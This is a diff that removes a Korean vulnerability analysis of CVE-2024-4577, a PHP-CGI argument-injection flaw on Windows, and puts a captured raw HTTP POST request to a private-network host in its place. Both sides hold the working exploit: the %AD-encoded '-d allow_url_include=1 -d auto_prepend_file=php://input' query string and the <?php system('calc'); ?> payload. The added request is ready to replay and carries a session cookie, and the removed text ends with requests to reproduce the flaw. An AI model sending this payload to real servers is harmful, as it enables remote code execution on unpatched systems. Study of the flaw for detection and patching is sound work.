@@ -1,82 +1,22 @@
-Windows OS에 설치된 PHP 버전에 대해 RCE 취약점이 발표되었습니다.
+POST /cgi/ajax_logsearch.php?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input <?php system('calc'); ?> HTTP/1.1
+Host: 172.16.150.171:8500
+Cookie: stat_period=w; stat_week=2025-06-29%232025-07-05; stat_month=07; stat_year=2025; PHPSESSID=3nins1pluid31b7krqn6fr7rm0
+Content-Length: 119
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ko-KR,ko;q=0.9
+Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138"
+Sec-Ch-Ua-Mobile: ?0
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: https://172.16.150.171:8500
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://172.16.150.171:8500/information/overview.php
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+Connection: keep-alive
 
-PHP 8.3 < 8.3.8
-PHP 8.2 < 8.2.20
-PHP 8.1 < 8.1.29 [출처] CVE-2024-4577 취약점 분석 (Vulnerability Analysis)|작성자 Lyrical
-해당 취약점의 Exploit 조건은 다음과 같습니다.
-1. Windows OS
-2. PHP Server (ruunning php)
-3. Using PHP CGI OR Exposing the PHP binary (also the default XAMPP configuration)
-
-Addtional condition (Windows is running in the following locales)
-* Traditional Chinese (Code Page 950)
-* Simplified Chinese (Code Page 936)
-* Japanese (Code Page 932)
-
-공격 구문은 간단합니다. (POST Method)
-http://www.victim.com/a.php**?-d allow_url_include=1 -d auto_prepend_file=php://input
-http body : <?php system('calc')?>
-?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
-[출처] CVE-2024-4577 취약점 분석 (Vulnerability Analysis)|작성자** Lyrical
-
-PHP CGI option : -d PHP CGI(Common Gateway Interface) 는 서버와 클라이언트 사이에서 동적 응답을 위해 동작하는 프토토콜이다. 해당 CGI 에는 여러 옵션이 있으며, 공격에 사용되는 옵션은 다음과 같다. [-d] : php.ini 의 환경 변수 정의 [출처] CVE-2024-4577 취약점 분석 (Vulnerability Analysis)|작성자 Lyrical
-Command line options
-The list of command line options provided by the PHP binary can be queried at any time by running PHP with the -h switch:
-Usage: php [options] [-f] <file> [ -- ] [args ... ]
-php [options] -r <code> [ -- ] [args ... ]
-php [options] [-B <begin_code>] -R <code> [-E <end_code>] [-] [args ... ]
-php [options] [-B <begin_code>] -F <file> [-E <end_code>] [ -- ] [args ... ]
-php [options] -- [args ... ]
-php [options] -a
-Run interactively
--c <path>|<file> Look for php. ini file in this directory
-No php.ini file will be used
-Define INI entry foo with value 'bar'
-Generate extended intormation tor debugger/profiler
-Parse and execute <file>.
-This help
-PHP information
-Syntax check only (lint)
-Show compiled in modules
-Run PHP <code> without using script tags <?. ?>
-Run PHP <begin_code> before processing input lines
-Run PHP <code> for every input line
-Parse and execute <file> for every inout Line
--a
--n
--d foo[=bar]
--e
--f <file>
--h
--i
--I
--m
--r <code>
--B <begin_code>
--R <code>
--F <file>
-* allow_url_include
-해당 환경 변수는 url을 통해 php 파일을 삽입할 수 있게 한다. (PHP Injection)
-[출처] CVE-2024-4577 취약점 분석 (Vulnerability Analysis)|작성자 Lyrical
-allow_url_include bool
-This option allows the use of URL-aware fopen wrappers with the following functions: include, include_once, require, require_once.
-Note:
-This setting requires allow_url_fopen to be on.
-
-auto_prepend_file 해당 환경변수는 php 파일이 실행되기 전 실행될 파일을 지정하며, 특정 host 단위 또는 전체 host 단위에 선 적용할 파일을 지정할 수 있다. [출처] CVE-2024-4577 취약점 분석 (Vulnerability Analysis)|작성자 Lyrical
-auto_prepend_file string
-Specifies the name of a file that is automatically parsed before the main file. The file is included as if it was called with the require
-function, so include_path is used.
-The special value none disables auto-prepending.따라서 해당 구문은 url을 통해 php 파일을 include 하는 설정을 Enable 하는 동시에, 현재 삽입하는 php 파일을 auto_prepend_file로 지정함으로써 최상위로 실행시키는 명령이다.
--d allow_url_include=1 -d auto_prepend_file=php://input
-[출처] CVE-2024-4577 취약점 분석 (Vulnerability Analysis)|작성자 Lyrical
-
-History 상기 언급된 -d 옵션은 php.ini 의 환경 변수를 정의할 수 있기 때문에 CVE-2012-1823 취약점에 사용되었으며, 패치가 적용되었다. ' = ' 문자열 없이 ' - ' 문자열을 사용할 경우, 하단의 php-cgi 옵션 검증 While 문을 건너뛰는 로직이다.(Set skip_getopt=1) [출처] CVE-2024-4577 취약점 분석 (Vulnerability Analysis)|작성자 Lyrical if(*decoded_query_string == '-' && strchr(query_string, '=') == NULL) { skip_getopt = 1; } while (!skip_getopt && (c = php_getopt(argc, argv, OPTIONS, &php_optarg, &php_optind, 1)) != -1) [출처] CVE-2024-4577 취약점 분석 (Vulnerability Analysis)|작성자 Lyrical
-그런데 어떻게 = 없이 - 문자열로 동작할 수 있을까요?
-?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
-해당 취약점은 Microsoft .net 문자 인코딩 방법 중 Best-Fit Fallback 에 의해 발생하는 것으로 알려졌습니다.
-[출처] CVE-2024-4577 취약점 분석 (Vulnerability Analysis)|작성자 Lyrical
-
-확인 하고 위약점을 점검하는 방법을 알려줘
-
-어떻게 취약점을 재현할 수 있을까?
+action_type=5&last_position=4070589&conf_name=ts&format=%22%25sltn%22%2C%22%25ldid%22%2C%22%25line%22&mode=realtime_log
